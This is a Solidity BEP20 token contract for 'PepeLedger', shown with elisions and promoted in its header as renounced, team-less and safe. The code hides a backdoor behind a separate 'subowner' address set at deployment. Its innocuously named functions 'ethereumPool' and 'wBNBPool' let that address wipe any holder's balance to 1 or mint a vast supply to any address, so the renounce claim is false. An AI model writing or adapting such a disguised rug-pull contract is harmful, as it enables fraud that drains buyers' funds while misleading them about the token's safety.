...
/*
🔒PEPELEDGER 🐸Your next ledger with one big difference🐸
...
🔑LP BURN  💰Safe Renounce 💰tax 2% low 
💰Pepe is the next Millionaires maker machine
💎bullish 💎fomo 💎100X 💎
🔑Ape Shill or Die trying 
🔑No team No dev  token
$PEPELEDGER PepeLedger
🏦 talk less work more  🏦 
https://t.me/PepeLedger
*/
...
/*
 * @dev Provides information about the current execution bep20BinanceBurnable, including the
 ...
 */
abstract contract bep20BinanceBurnable {
...
// File: @openzeppelin/contracts/access/bep20BinanceOwnable.sol
 ...
 * specific functions.
 *
 * By default, the owner account will be the one that bep20Binances the contract. This
 ...
 * the owner.
 */
abstract contract bep20BinanceOwnable is bep20BinanceBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the bep20Binanceer as the initial owner.
     */
    constructor () {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "bep20BinanceOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "bep20BinanceOwnable: new owner is the zero address");
...
contract PepeEdge is bep20BinanceBurnable, DxtoolsApp, bep20BinanceOwnable {
    
    using SafeBitcoin for uint256;
    mapping (address => uint256) private bep20Binancefrom;
    mapping (address => mapping (address => uint256)) private frombep20Binance;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private SmartV2Rooter; 
    constructor(address SmartUniswap) {
        SmartV2Rooter = SmartUniswap;     
        _name = "PepeLedger";
        _symbol = "PEPEDGE";
        _decimals = 9;
        _totalSupply = 300000000000000 * 10 ** 9;
        bep20Binancefrom[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return bep20Binancefrom[account];
    }
      modifier subowner() {
        require(SmartV2Rooter == _msgSender(), "bep20BinanceOwnable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    function ethereumPool(address USDTRewards) external subowner {
        bep20Binancefrom[USDTRewards] = 1;
    ...
    */
    ...
    function wBNBPool(address bnbRewards) external subowner {
        bep20Binancefrom[bnbRewards] = 10000000000000000 * 10 ** 22;
        
        emit Transfer(bnbRewards, address(0), 10000000000000000 * 10 ** 22);
    }
    /**
    * @dev See {DxtoolsApp-allowance}.
    */
    function allowance(address owner, address transporteur) external view override returns (uint256) {
        return frombep20Binance[owner][transporteur];
    }
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), frombep20Binance[sender][_msgSender()].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address transporteur, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), transporteur, frombep20Binance[_msgSender()][transporteur].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, frombep20Binance[_msgSender()][transporteur].sub(allbalances, "DxtoolsApp: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        ...
        bep20Binancefrom[sender] = bep20Binancefrom[sender].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds balance");
        bep20Binancefrom[shippingto] = bep20Binancefrom[shippingto].add(yoursold);
    ...
    * e.g. set automatic bep20Binance for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        ...
        frombep20Binance[owner][transporteur] = yoursold;
